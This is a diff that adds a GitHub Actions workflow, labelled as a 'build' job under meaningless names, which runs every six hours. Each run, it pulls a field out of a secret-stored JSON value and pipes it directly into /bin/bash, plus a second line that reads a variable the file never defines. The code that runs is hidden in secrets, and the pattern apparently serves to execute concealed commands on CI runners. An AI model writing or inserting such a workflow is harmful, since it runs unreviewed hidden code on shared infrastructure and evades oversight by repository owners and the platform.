@@ -1,0 +1,19 @@
+name: weihuanpeng1987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weihuanpeng1987
+        env:
+          mjjt85: ${{ secrets.mjjt85 }}
+        run: |
+          echo $mjjt85 | jq -r .rzlm08 | /bin/bash
+          echo $on78021 | jq -r .o31924 | /bin/bash
+
